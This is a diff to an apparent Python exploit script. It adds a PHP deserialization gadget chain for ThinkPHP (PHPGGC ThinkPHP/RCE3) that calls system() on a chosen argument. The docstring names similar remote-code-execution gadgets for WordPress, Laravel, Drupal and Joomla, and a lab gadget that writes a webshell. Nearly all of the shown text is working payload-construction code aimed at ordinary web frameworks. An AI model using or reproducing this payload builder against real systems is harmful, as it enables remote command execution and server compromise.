@@ -82,8 +82,9 @@ def set_gadget(name: str, arg: str = "") -> None:
     """Choose the planted record: 'filecache' (lab gadget, writes a
     webshell), a framework gadget that runs arg via system()
     ('wordpress' WP core, 'laravel' PHPGGC Laravel/RCE9, 'drupal'
-    PHPGGC Drupal7/RCE1), or 'joomla' (PHPGGC Joomla/FW1 - a file
-    write whose random shell is then probed)."""
+    PHPGGC Drupal7/RCE1, 'thinkphp' PHPGGC ThinkPHP/RCE3), or
+    'joomla' (PHPGGC Joomla/FW1 - a file write whose random shell is
+    then probed)."""
     global GADGET, WP_ARG
     GADGET, WP_ARG = name, arg
 
@@ -98,6 +99,31 @@ SEP = b":" + b'"'
 
 
 def obj_bytes() -> bytes:
+    if GADGET == "thinkphp":
+        # PHPGGC ThinkPHP/RCE3 (-6.0.1+; measured on ThinkPHP 6.1.5
+        # with --test-payload), byte-identical to phpggc's output for
+        # the same arguments: Psr6Cache::__destruct ->
+        # League\Flysystem\Directory -> think\Validate::$type ->
+        # call_user_func(system, arg). The \0Class\0 / \0*\0
+        # prefixes are PHP's private/protected encoding - raw bytes in
+        # the bio body value, which Laravel already proved survives.
+        arg = WP_ARG.encode()
+        return (b'evil|O:41:"League\\Flysystem\\Cached\\Storage\\'
+                b'Psr6Cache":3:'
+                b'{s:47:"\x00League\\Flysystem\\Cached\\Storage\\'
+                b'Psr6Cache\x00pool";'
+                b'O:26:"League\\Flysystem\\Directory":2:'
+                b'{s:13:"\x00*\x00filesystem";'
+                b'O:26:"League\\Flysystem\\Directory":2:'
+                b'{s:13:"\x00*\x00filesystem";'
+                b'O:14:"think\\Validate":1:'
+                b'{s:7:"\x00*\x00type";a:1:{s:3:"key";s:6:"system";}}'
+                b's:7:"\x00*\x00path";s:'
+                + str(len(arg)).encode() + SEP + arg
+                + b'";}'
+                b's:7:"\x00*\x00path";s:3:"key";}'
+                b's:11:"\x00*\x00autosave";b:0;'
+                b's:6:"\x00*\x00key";a:1:{i:0;s:8:"anything";}}')
     if GADGET == "joomla":
         # PHPGGC Joomla/FW1 (3.9.0 <= 5.2.1; fixed in 5.2.2's
         # __wakeup guard), byte-identical to phpggc's output for the
